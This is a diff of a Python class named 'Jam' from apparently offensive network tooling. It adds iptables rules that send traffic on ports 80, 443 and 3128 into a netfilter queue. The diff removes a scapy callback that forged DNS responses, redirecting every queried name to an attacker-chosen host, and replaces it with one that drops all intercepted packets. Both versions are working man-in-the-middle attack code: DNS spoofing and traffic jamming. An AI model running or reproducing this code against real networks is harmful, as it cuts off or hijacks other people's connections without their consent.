@@ -32,7 +32,6 @@ class Jam(object):
 		self.blocks = []
 
 	def mitmdropstart(self,host):
-                os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
                 os.system('iptables -t nat -A PREROUTING -p tcp --dport 80 -j NFQUEUE --queue-num 1')
                 os.system('iptables -t nat -A PREROUTING -p tcp --dport 443 -j NFQUEUE --queue-num 1')
                 os.system('iptables -t nat -A PREROUTING -p tcp --dport 3128 -j NFQUEUE --queue-num 1')
@@ -47,7 +46,6 @@ class Jam(object):
 			print "[!] Exception caught: {}".format(e)
 
 	def mitmdropstop(self):
-                os.system('iptables -t nat -D PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
 		os.system('iptables -t nat -D PREROUTING -p tcp --dport 80 -j NFQUEUE --queue-num 1')
 		os.system('iptables -t nat -D PREROUTING -p tcp --dport 443 -j NFQUEUE --queue-num 1')
 		os.system('iptables -t nat -D PREROUTING -p tcp --dport 3128 -j NFQUEUE --queue-num 1')
@@ -60,18 +58,7 @@ class Jam(object):
 
 
 	def callback(self, packet):
-                payload = packet.get_payload()
-                pkt = IP(payload)
-                if not pkt.haslayer(DNSQR):
-			packet.drop()
-		else:
-			new_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
-                        	UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
-                                DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
-                                an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.host))
-                        packet.set_payload(str(new_pkt))
-                        packet.accept()
-
+		packet.drop()
 
 	def filter(self):
 		try:
